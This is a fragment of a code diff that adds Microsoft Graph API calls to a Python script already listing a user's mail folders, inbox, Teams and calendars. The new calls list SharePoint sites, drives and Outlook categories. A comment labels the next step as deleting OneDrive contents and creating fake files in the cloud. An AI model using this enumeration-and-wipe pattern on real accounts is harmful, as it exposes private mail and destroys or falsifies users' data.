@@ -80,6 +80,10 @@ safe_get(f"https://graph.microsoft.com/v1.0/users/{user_email}/mailFolders", "�
 safe_get(f"https://graph.microsoft.com/v1.0/users/{user_email}/mailFolders/inbox/messages?$top=1", "📥 Inbox latest")
 safe_get(f"https://graph.microsoft.com/v1.0/users/{user_email}/joinedTeams", "💬 Teams")
 safe_get(f"https://graph.microsoft.com/v1.0/users/{user_email}/calendars", "📅 Calendar list")
+safe_get(f"https://graph.microsoft.com/v1.0/sites/root/lists", "list")
+safe_get(f"https://graph.microsoft.com/v1.0/sites/root", "root list")
+safe_get(f"https://graph.microsoft.com/v1.0/sites/root/drives", "dive list")
+safe_get(f"https://graph.microsoft.com/beta/me/outlook/masterCategories", "outlook")
 
 # Step 4 - Xoá nội dung thư mục OneDrive và tạo file giả trực tiếp trên cloud
 
